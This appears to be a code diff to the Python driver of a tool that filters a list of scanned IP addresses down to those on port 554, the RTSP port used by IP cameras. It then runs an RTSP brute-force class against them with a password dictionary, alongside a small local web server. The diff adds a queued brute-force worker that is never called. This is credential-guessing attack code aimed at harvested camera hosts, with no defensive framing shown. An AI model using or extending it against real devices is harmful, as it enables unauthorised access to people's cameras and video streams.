@@ -3,6 +3,7 @@ import json
 import time
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import threading
+from queue import Queue
 
 from rtspBrute import RtspBrute
 from common import cargar_datos, guardar_datos, eliminar_duplicados, buscar_palabra, actualizar_datos, extraer_texto_desde_imagen
@@ -18,8 +19,6 @@ class NoCacheHandler(SimpleHTTPRequestHandler):
         self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
         super().end_headers()
 
-
-
 def start_http_server():
     port = 8080
     server_address = ('', port)
@@ -32,22 +31,33 @@ def start_http_server():
         print("Servidor detenido.")
         httpd.server_close()
 
+def brute_force_worker(q, dictionary_file):
+    while True:
+        target = q.get()
+        if target is None:
+            break
+        ip, port = target
+        brute = RtspBrute(targets=[(ip, port)], dictionary_file=dictionary_file)
+        brute.run()
+        q.task_done()
 
 if __name__ == '__main__':
-    # Iniciar un hilo para actualizar los datos cada 10 segundos
+
     threading.Thread(target=actualizar_datos, daemon=True).start()
 
     # Iniciar el servidor HTTP en un hilo separado
     server_thread = threading.Thread(target=start_http_server)
     server_thread.start()
 
-    # Cargar datos desde el archivo JSON
-    with open('datos.json', 'r') as file:
-        data = json.load(file)
-
     # Filtrar las entradas para obtener solo las que usan el puerto 554
+    data = cargar_datos()
+
+    # Filtrar las IPs y puertos que utilizan el puerto 554
     targets = [(entry['IP'], 554) for entry in data if entry['Puerto'] == 554]
 
-    # Iniciar RtspBrute con las direcciones IP y puertos cargados desde el archivo JSON
+    # Crear e iniciar el objeto RtspBrute con todas las direcciones IP filtradas
     brute = RtspBrute(targets=targets, dictionary_file="diccionario.txt")
     brute.run()
+
+    # Esperar a que el hilo del servidor HTTP termine antes de cerrar el programa principal
+    server_thread.join()
